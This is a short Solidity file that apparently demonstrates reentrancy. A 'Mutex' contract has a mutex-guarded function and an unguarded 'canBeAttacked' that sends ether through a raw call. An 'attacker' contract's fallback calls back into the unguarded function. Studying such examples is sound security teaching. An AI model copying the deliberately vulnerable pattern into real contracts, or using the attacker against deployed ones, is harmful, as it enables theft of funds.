 pragma solidity ^0.4.19;
 contract Mutex {
 bool locked;


modifier noReentrancy() {
require(!locked);
locked = true;
_;
locked = false;
}

 function Mutex() public payable {
   locked=false;
}

function canBeAttacked() public  returns (uint) {
require(msg.sender.call.value(1 ether)());
return 7;
 }


  function f() public noReentrancy returns (uint) {
require(msg.sender.call());
  return 7;
  }
 }

  contract attacker{
      bool again=false;
function attacker() public  {

   }   
      function() public  payable{
             if(!again){
              again=true;
            Mutex(msg.sender).canBeAttacked();
         }
     }
   function payment(Mutex mutex) public {
        mutex.canBeAttacked();
    }
 }
